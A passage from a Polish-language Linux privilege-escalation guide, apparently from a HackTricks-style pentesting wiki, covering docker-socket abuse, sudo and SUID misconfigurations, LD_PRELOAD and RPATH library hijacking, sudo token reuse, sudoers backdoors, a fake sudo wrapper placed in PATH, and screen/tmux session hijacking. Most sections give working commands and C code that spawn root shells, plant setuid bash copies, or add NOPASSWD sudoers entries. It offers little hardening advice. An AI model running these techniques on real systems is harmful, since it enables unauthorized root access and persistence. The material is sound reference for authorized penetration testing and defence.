curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonywanie poleceń w jego środowisku.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po ustawieniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z uprawnieniami root do systemu plików hosta.

### Inne

Zauważ, że jeśli masz prawa zapisu do docker socket, ponieważ jesteś **inside the group `docker`**, masz [**więcej sposobów na eskalację uprawnień**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wydostanie się z docker lub wykorzystanie go do eskalacji uprawnień** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacja uprawnień

Jeśli możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie nadużyć go w celu eskalacji uprawnień**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacja uprawnień

Jeśli możesz użyć polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie nadużyć go w celu eskalacji uprawnień**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system komunikacji międzyprocesowej (IPC), który umożliwia aplikacjom efektywną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny, obsługując podstawowe IPC, które usprawnia wymianę danych między procesami, przypominając **enhanced UNIX domain sockets**. Ponadto pomaga w rozgłaszaniu zdarzeń lub sygnałów, ułatwiając bezproblemową integrację komponentów systemu. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus obsługuje system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, usprawniając procesy, które wcześniej były złożone.

D-Bus działa w modelu **allow/deny**, zarządzając uprawnieniami do wiadomości (wywołania metod, emisje sygnałów itp.) w oparciu o skumulowany efekt pasujących reguł polityki. Te polityki określają interakcje z busem, co potencjalnie może umożliwić eskalację uprawnień przez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` pokazuje uprawnienia dla użytkownika root: posiadanie, wysyłanie i odbieranie wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy stosują się uniwersalnie, natomiast polityki w kontekście "default" mają zastosowanie do wszystkich, którzy nie są objęci innymi, bardziej szczegółowymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerate i exploit komunikację D-Bus tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerate the network i ustalić pozycję maszyny.

### Ogólna enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdź usługi sieciowe działające na maszynie, z którymi nie mogłeś wcześniej wejść w interakcję przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli uda ci się, możesz być w stanie grab some credentials.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź, kim jesteś, jakie masz **uprawnienia**, którzy **użytkownicy** są w systemie, którzy mogą się **zalogować** i którzy mają **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Niektóre wersje systemu Linux były dotknięte błędem, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby nadać ci uprawnienia roota:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** w środowisku, **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego hałasu i binaria `su` oraz `timeout` są obecne na komputerze, możesz spróbować przeprowadzić brute-force na użytkowniku używając [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` także próbuje przeprowadzić brute-force użytkowników.

## Nadużycia związane z zapisywalnym $PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisać w jakimś katalogu należącym do $PATH** możesz być w stanie eskalować uprawnienia przez **utworzenie backdoor wewnątrz zapisywalnego katalogu** o nazwie jakiegoś polecenia, które zostanie wykonane przez innego użytkownika (najlepiej root) i które **nie jest ładowane z folderu znajdującego się wcześniej** w $PATH niż Twój zapisywalny katalog.

### SUDO and SUID

Możesz mieć uprawnienia do wykonania jakiegoś polecenia przez sudo lub polecenia mogą mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików, a nawet na wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może umożliwić użytkownikowi wykonanie polecenia z uprawnieniami innego użytkownika bez podawania hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`; łatwo jest uzyskać powłokę, dodając klucz ssh do katalogu `root` lub wywołując `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, który pozwalał załadować dowolną bibliotekę python podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Jeżeli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać nieinteraktywne zachowanie startowe Bash, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.

- Why it works: Dla nieinteraktywnych powłok, Bash ocenia `$BASH_ENV` i źródłuje ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchomienie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowany przez sudo, twój plik zostanie załadowany z uprawnieniami roota.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny docelowy program, który wywołuje `/bin/bash` w trybie nieinteraktywnym, lub dowolny skrypt bash).
- `BASH_ENV` obecny w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Wzmacnianie:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`, używaj raczej `env_reset`.
- Unikaj shell wrappers dla sudo-allowed commands; używaj minimalnych binariów.
- Rozważ sudo I/O logging i alerting, gdy preserved env vars są używane.

### Ścieżki omijania wykonania sudo

**Jump** — odczytaj inne pliki lub użyj **symlinks**. Na przykład w sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty jest **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez określenia ścieżki

Jeśli przyznano **uprawnienie sudo** dla pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli **suid** binary **wykonuje inne polecenie bez podania ścieżki do niego (zawsze sprawdź zawartość dziwnego SUID binary za pomocą** _**strings**_**)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary z określoną ścieżką polecenia

Jeśli **suid** binary **wykonuje inne polecenie określając ścieżkę**, to możesz spróbować **wyeksportować funkcję** nazwaną tak jak polecenie, które wywołuje plik suid.

Na przykład, jeśli suid binary wywołuje _**/usr/sbin/service apache2 start**_ musisz spróbować stworzyć taką funkcję i wyeksportować ją:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz suid binary, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do wskazania jednej lub więcej bibliotek współdzielonych (.so files), które mają zostać załadowane przez loader przed wszystkimi innymi, w tym przed standardową biblioteką C (`libc.so`). Proces ten jest znany jako wstępne ładowanie biblioteki.

Jednak, aby zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku wykonywalnych suid/sgid, system narzuca pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla plików wykonywalnych, w których rzeczywisty identyfikator użytkownika (_ruid_) nie zgadza się z efektywnym identyfikatorem użytkownika (_euid_).
- Dla plików wykonywalnych z suid/sgid, wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają suid/sgid.

Eskalacja uprawnień może wystąpić, jeśli masz możliwość wykonywania poleceń z użyciem `sudo` i wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala, by zmienna środowiskowa **LD_PRELOAD** przetrwała i była uwzględniana nawet podczas uruchamiania poleceń z `sudo`, co może prowadzić do uruchomienia dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może zostać wykorzystany, jeśli atakujący kontroluje env variable **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kiedy natrafisz na binary z uprawnieniami **SUID**, które wydają się nietypowe, dobrą praktyką jest sprawdzenie, czy poprawnie ładuje pliki **.so**. Sprawdzić to można, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjalną możliwość eksploatacji.

Aby to wykorzystać, należy utworzyć plik C, powiedzmy _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu eskalację uprawnień poprzez manipulację prawami dostępu do plików oraz uruchomienie shell z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku shared object (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Wreszcie uruchomienie dotkniętego pliku binarnego SUID powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy SUID binary, który ładuje library z folderu, do którego możemy zapisywać, utwórzmy w tym folderze library o odpowiedniej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że biblioteka, którą wygenerowałeś, musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to skatalogowana lista binarek Unix, które mogą być wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to to samo, ale dla przypadków, gdy możesz **tylko wstrzykiwać argumenty** w polecenie.

Projekt zbiera legalne funkcje binarek Unix, które można nadużyć, aby uciec z ograniczonych shelów, eskalować lub utrzymać podwyższone uprawnienia, przesyłać pliki, uruchamiać bind i reverse shelle oraz ułatwiać inne zadania post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli możesz uzyskać dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aby sprawdzić, czy znajdzie sposób na wykorzystanie jakiejkolwiek reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **sudo access** ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przechwytując token sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" użył **`sudo`** do wykonania czegoś w **ostatnich 15 minut** (domyślnie to czas trwania tokena sudo, który pozwala używać `sudo` bez wprowadzania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` ma wartość 0
- `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia przy użyciu:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Pierwszy **exploit** (`exploit.sh`) utworzy binarkę `activate_sudo_token` w _/tmp_. Możesz jej użyć, aby **aktywować token sudo w swojej sesji** (nie otrzymasz automatycznie powłoki root, wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi exploit (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **należącą do root z setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Ten **trzeci exploit** (`exploit_v3.sh`) utworzy plik sudoers, który uczyni **sudo tokens wiecznymi i pozwoli wszystkim użytkownikom korzystać z sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w tym katalogu lub na którymkolwiek z plików utworzonych w jego wnętrzu, możesz użyć programu binarnego [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **utworzyć sudo token dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik o PID 1234, możesz **uzyskać uprawnienia sudo** bez potrzeby znajomości hasła wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` określają, kto może używać `sudo` i jak. Te pliki **domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeżeli** możesz ten plik **odczytać**, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisać** dowolny plik, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli masz uprawnienia do zapisu, możesz je nadużyć.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD, pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **user usually connects to a machine and uses `sudo`** aby eskalować uprawnienia i uzyskałeś shell w kontekście tego usera, możesz **create a new sudo executable** który wykona twój kod jako root, a następnie polecenie tego usera. Następnie **modify the $PATH** kontekstu usera (na przykład dodając nową ścieżkę w .bash_profile), tak że gdy user uruchomi sudo, zostanie wywołany twój sudo executable.

Zwróć uwagę, że jeśli user używa innego shell (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj plik ten zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład, zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie wyszukiwał biblioteki w katalogu `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia zapisu** do którejkolwiek ze wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnego pliku wewnątrz `/etc/ld.so.conf.d/` lub dowolnego folderu wskazanego w pliku konfiguracyjnym w `/etc/ld.so.conf.d/*.conf`, może uzyskać eskalację uprawnień.\
Zobacz **jak wykorzystać tę błędną konfigurację** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując lib do `/var/tmp/flag15/`, zostanie ona użyta przez program w tym miejscu, zgodnie z ustawieniem zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uprawnienia

Linux capabilities zapewniają procesowi **podzbiór dostępnych uprawnień roota**. Efektywnie dzieli to uprawnienia roota na **mniejsze i odrębne jednostki**. Każdej z tych jednostek można następnie niezależnie przyznać procesom. W ten sposób pełny zestaw uprawnień jest zredukowany, zmniejszając ryzyko wykorzystania.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i sposobach ich nadużywania**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Uprawnienia katalogów

W katalogu, bit **dla "execute"** oznacza, że dany użytkownik może **"cd"** do tego folderu.\
Bit **"read"** oznacza, że użytkownik może wyświetlić listę plików, a bit **"write"** oznacza, że użytkownik może usuwać i tworzyć nowe pliki.

## ACLs

Access Control Lists (ACLs) stanowią drugą warstwę uprawnień dyskrecjonalnych, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do plików lub katalogów, pozwalając na przyznanie lub odmowę praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **szczegółowości zapewnia bardziej precyzyjne zarządzanie dostępem**. Dalsze szczegóły można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" uprawnienia do odczytu i zapisu do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACLs z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte sesje shell

W **starych wersjach** możesz **hijack** niektóre sesje **shell** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **connect** tylko do sesji **screen** należących do **twojego własnego użytkownika**. Jednak możesz znaleźć **interesujące informacje wewnątrz sesji**.

### screen sessions hijacking

**Wyświetl sesje screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem ze **starymi wersjami tmux**. Nie udało mi się przeprowadzić hijacka sesji tmux (v2.1) utworzonej przez root jako nieuprzywilejowany użytkownik.

**Lista sesji tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, etc) między wrześniem 2006 a 13 maja 2008 mogą być dotknięte tym błędem.\
Błąd występuje podczas tworzenia nowego ssh key w tych OS, ponieważ **jedynie 32,768 variations were possible**. To oznacza, że wszystkie możliwości można wyliczyć i **mając the ssh public key możesz wyszukać odpowiadający klucz prywatny**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Ciekawe wartości konfiguracji

- **PasswordAuthentication:** Określa, czy uwierzytelnianie za pomocą hasła jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie kluczem publicznym jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustym hasłem. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może logować się przez ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może się zalogować używając hasła i klucza prywatnego
- `without-password` or `prohibit-password`: root może się logować tylko przy użyciu klucza prywatnego
- `forced-commands-only`: Root może się logować tylko przy użyciu klucza prywatnego i jeśli określone są forced commands
- `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki bezwzględne** (rozpoczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala ci **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. Dzięki temu będziesz w stanie **jump** via ssh **to a host** i stamtąd **jump to another** host **using** the **key** located in your **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` jest `*`, za każdym razem gdy użytkownik przełącza się na inną maszynę, ta maszyna będzie mogła uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zabronić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwolić** lub **zablokować** ssh-agent forwarding przy pomocy słowa kluczowego `AllowAgentForwarding` (domyślnie zezwala).

Jeśli odkryjesz, że Forward Agent jest skonfigurowany w środowisku, zapoznaj się z następującą stroną, ponieważ **możesz być w stanie to wykorzystać, aby eskalować uprawnienia**:


